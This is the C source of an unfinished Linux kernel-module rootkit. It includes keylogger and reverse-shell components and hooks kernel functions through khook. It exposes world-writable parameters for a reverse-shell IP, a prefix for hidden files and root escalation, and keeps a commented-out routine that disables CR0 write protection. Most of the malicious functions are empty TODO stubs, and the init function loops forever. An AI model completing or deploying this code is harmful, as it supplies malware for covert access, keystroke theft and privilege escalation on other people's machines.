/**
 * @file    rootkit.c
 * @author  Aaron Lichtman, Arch Gupta  and Brandon Weidner
 * @brief   A rootkit. TODO: Expand description
 */
#include <linux/fs.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include "arsenal/keylogger.c"
#include "arsenal/reverse-shell.c"
#include "khook/engine.c"

MODULE_AUTHOR("Aaron Lichtman");
MODULE_AUTHOR("Arch Gupta");
MODULE_AUTHOR("Brandon Weidner");
MODULE_DESCRIPTION("Linux rootkit.");
MODULE_VERSION("0.1");
MODULE_LICENSE("GPL");

/**
 * Module parameters are made writable by anyone.
 * Any interaction with the rootkit will be through a command like:
 * $ echo "1" > /sys/module/garden/parameters/get_root. This will
 * update the value of the get_root parameter. We can poll this value
 * intermittently and do things when it changes.
 **/

static char* rev_shell_ip = NULL;
module_param(rev_shell_ip, charp, 0777);
MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
static char* hidden_file_prefix = NULL;
module_param(hidden_file_prefix, charp, 0777);
MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
static bool escalate_privileges = false;
module_param(escalate_root_priveleges, bool, 0777);
MODULE_PARM_DESC(escalate_root_priveleges, "Toggle for escalating current user to root.");

// TODO: Figure out if this is needed at all.
// /**
//  * Overwrite the 16th bit in the CR0 register to disable write protection.
//  */
// void disable_write_protection() {
//     unsigned long value;
//     asm volatile("mov %%cr0,%0" : "=r"(value));
//     if (value & 0x00010000) {
//         value &= ~0x00010000;
//                 asm volatile("mov %0,%%cr0" ::"r"(value));
//     }
// }

// Hooking open syscall?
/**
KHOOK(fget);
static int khook_fget(unsigned int fd) {
    int original = KHOOK_ORIGIN(fget, fd);
    printk("%s(%d) = %d\n", __func__, fd, original);
    return original;
}
**/

// Example hook for testing build process.
KHOOK(inode_permission);
static int khook_inode_permission(struct inode* inode, int mask) {
    int ret = 0;
    ret = KHOOK_ORIGIN(inode_permission, inode, mask);
    printk("%s(%p, %08x) = %d\n", __func__, inode, mask, ret);
    return ret;
}

/**
 * Gives the current user root priveleges.
 **/
static void get_root() {
    // TODO
}

/**
 * Rootkit module initialization.
 */
static int __init rootkit_init(void) {
    printk(KERN_INFO "Initializing rootkit.\n");
    khook_init();

    while (true) {
        /**
         * TODO: Check on /sys/module/garden/parameters/<PARAM> to see if it's changed since last check.
         * This change should theoretically be reflected in the global variable.
         **/

        if (rev_shell_ip) {
            // TODO: Set up reverse shell.
        }

        if (hidden_file_prefix) {
            // TODO: Set up hidden files.
        }

        if (escalate_privileges) {
            get_root();
        }
    }

    return 0;
}

/**
 * Called at exit. All cleanup should be done here.
 */
static void __exit rootkit_exit(void) {
    printk(KERN_INFO "Cleaning up rootkit.\n");
    khook_cleanup();
}

module_init(rootkit_init);
module_exit(rootkit_exit);
